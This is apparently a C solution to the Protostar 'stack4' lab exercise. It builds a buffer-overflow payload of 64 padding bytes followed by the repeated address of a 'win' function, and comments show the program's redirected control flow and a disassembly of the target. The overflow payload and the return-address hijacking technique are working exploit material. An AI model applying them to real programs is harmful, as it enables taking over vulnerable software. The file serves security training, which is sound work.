#include <stdio.h>

int main(void){
    //buffer
    for(int i = 0; i < 64 ; i++){
        printf("A");
    }
    // print endianess independent
    int payload = 0x80483f4; //win function
    for(int bruteforce = 0; bruteforce < 10; bruteforce++){
      for(int i = 0; i < 4 ; i++){
          printf("%c", ((char*)&payload)[i]);
      }
    }
    return 0;
}

/*
user@protostar:~$ gcc stack4.c -o stack4 --std=c99
user@protostar:~$ ./stack4 | /opt/protostar/bin/stack4
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
Illegal instruction
*/

/*
user@protostar:~$ objdump -d /opt/protostar/bin/stack4

/opt/protostar/bin/stack4:     file format elf32-i386


Disassembly of section .init:

 ...
 Disassembly of section .text:
 ...
 080483f4 <win>:
  80483f4:       55                      push   %ebp
  80483f5:       89 e5                   mov    %esp,%ebp
  80483f7:       83 ec 18                sub    $0x18,%esp
  80483fa:       c7 04 24 e0 84 04 08    movl   $0x80484e0,(%esp)
  8048401:       e8 26 ff ff ff          call   804832c <puts@plt>
  8048406:       c9                      leave
  8048407:       c3                      ret


*/
